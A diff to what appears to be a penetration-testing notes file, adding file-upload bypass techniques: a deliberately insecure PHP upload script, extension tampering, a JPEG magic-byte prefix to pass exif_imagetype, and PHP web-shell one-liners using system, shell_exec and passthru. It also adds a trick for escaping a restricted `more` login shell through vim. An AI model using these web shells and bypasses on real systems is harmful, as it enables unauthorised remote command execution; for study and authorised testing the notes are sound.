@@ -395,6 +395,131 @@ There's another tool called `fimap <https://tools.kali.org/web-applications/fima
 Also, if we have unprivileged user shell, however don't have permission to write in /var/www/html but does have LFI, we can still write (php meterpreter shell) in /tmp or user home directory and utilize LFI to get a reverse shell.
 
 
+File Upload
+^^^^^^^^^^^
+Let's see few examples of File Upload
+
+* Simple File Upload - Intercepting the request in Burp/ ZAP and changing the file-extension.
+
+ Below is the PHP code
+
+ ::
+
+  <?  
+
+  function genRandomString() { 
+    $length = 10; 
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz"; 
+    $string = "";     
+
+    for ($p = 0; $p < $length; $p++) { 
+        $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
+    } 
+
+    return $string; 
+  } 
+
+  function makeRandomPath($dir, $ext) { 
+    do { 
+    $path = $dir."/".genRandomString().".".$ext; 
+    } while(file_exists($path)); 
+    return $path; 
+  } 
+
+  function makeRandomPathFromFilename($dir, $fn) { 
+    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
+    return makeRandomPath($dir, $ext); 
+  } 
+
+  if(array_key_exists("filename", $_POST)) { 
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 
+
+
+        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
+        echo "File is too big"; 
+    } else { 
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
+        } else{ 
+            echo "There was an error uploading the file, please try again!"; 
+        } 
+    } 
+  } else { 
+  ?> 
+  <form enctype="multipart/form-data" action="index.php" method="POST">  
+  <input type="hidden" name="MAX_FILE_SIZE" value="1000" />  
+  <input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />  
+  Choose a JPEG to upload (max 1KB):<br/>  
+  <input name="uploadedfile" type="file" /><br />  
+  <input type="submit" value="Upload File" />  
+  </form>  
+  <? } ?>   
+
+ If we change the extension of filename tag from JPG to PHP, we may be able to execute code remotely.
+
+ * Create a fake JPG containing php code.
+
+  We’ll be using system() to read our password.
+
+  ::
+
+   echo "<?php system($_GET["cmd"]); ?>" > shell.jpg  
+
+ * Upload JPG, intercept in Burp/ ZAP and change the extension
+
+  ::
+
+   <input name="filename" value="o0xn5q93si.jpg" type="hidden">  
+
+  is changed to
+
+  ::
+
+  <input name="filename" value="o0xn5q93si.php" type="hidden">  
+
+* Simple File Upload - With verifying image type
+
+ In this the above PHP code remain almost the same apart from little addition that we check the filetype of the file uploaded
+
+ ::
+
+  <?php  
+  ...  
+  
+  else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {  
+        echo "File is not an image";  
+    }  
+  
+  ...  
+  
+  ?> 
+
+ Since the exif_imagetype function checks the filetype of the uploaded file. It checks the first bytes of an image are against a signature. Most filetypes such as JPEG, ZIP, TAR, etc. have a "Magic Number" at the beginning of the file to help verify its file type. So to pass the exif_imagetype function check, our file must start with the magic number of a supported image format.
+
+ * Take a valid file (JPG or whichever file format, we are trying to bypass), take the valid hexdump of that file (Let's say first 100 bytes)
+
+  ::
+
+   hexdump -n 100 -e '100/1 "\\x%02X" "\n"' sunflower.jpg
+
+   -n length         : Interpret only length bytes of Input
+   -e format_string  : Specify a format string to be used for displaying data
+
+  Example:
+ 
+  ::
+
+   hexdump -n 100 -e '100/1 "\\x%02X" "\n"' sunflower.jpg
+   \xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x01\x01\x2C\x01\x2C\x00\x00\xFF\xE1\x00\x16\x45\x78\x69\x66\x00\x00\x4D\x4D\x00\x2A\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\xFF\xDB\x00\x43\x00\x05\x03\x04\x04\x04\x03\x05\x04\x04\x04\x05\x05\x05\x06\x07\x0C\x08\x07\x07\x07\x07\x0F\x0B\x0B\x09\x0C\x11\x0F\x12\x12\x11\x0F\x11\x11\x13\x16\x1C\x17\x13\x14\x1A\x15\x11\x11\x18\x21\x18\x1A\x1D\x1D\x1F
+  
+ * Create a file with JPG header and command shell code using python
+
+  ::
+
+   >>> fh = open('shell.php','w')  
+   >>> fh.write('The Hexdump from above \xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')  
+   >>> fh.close()   
+
 Reverse Shells
 --------------
 
@@ -424,13 +549,19 @@ PHP
 
  :: 
 
-   <?php system($\_GET["cmd"]); ?>
+   <?php system($_GET["cmd"]); ?>
 
  or
 
  :: 
 
-   <?php echo shell_exec($\_GET["cmd"]); ?>
+   <?php echo shell_exec($_GET["cmd"]); ?>
+
+ or
+
+ ::
+
+   <? passthru($_GET["cmd"]); ?>
 
  which can be accessed by
 
@@ -1958,6 +2089,25 @@ Others
   * binascii.unhexlify(hexstr) to convert hex to string
   * base64.decodestring(str) to decode base64 string
 
+ * Getting out of more
+  
+  If in somecase, we are unable to ssh into the machine or being logged out when trying ssh, check the /etc/passwd file for the shell defined for that user.
+
+  ::
+   
+    cat /etc/passwd | grep user1
+    user1:x:11026:11026:user level 1:/home/user1:/usr/bin/showtext
+
+  Here Instead of /bin/bash, user1 is using /usr/bin/showtext, which is apparently not a shell. Let’s look at the content of the file
+
+  ::
+
+    cat /usr/bin/showtext
+    #!/bin/sh
+    more ~/text.txt
+    exit 0
+
+  In such cases, First, minimize your terminal so that when we are logged into user1 via ssh command, the large text will force a “more” message to prompt us to continue the output. Now that we have forced the terminal to prompt us to continue the display via “more” or “–More–(50%)” in this case, press “v” to enter “vim”, a built-in text editor on Unix machines. Once, we have vim interface, use :shell to get a shell 
 
 Cyber-Deception
 ===============
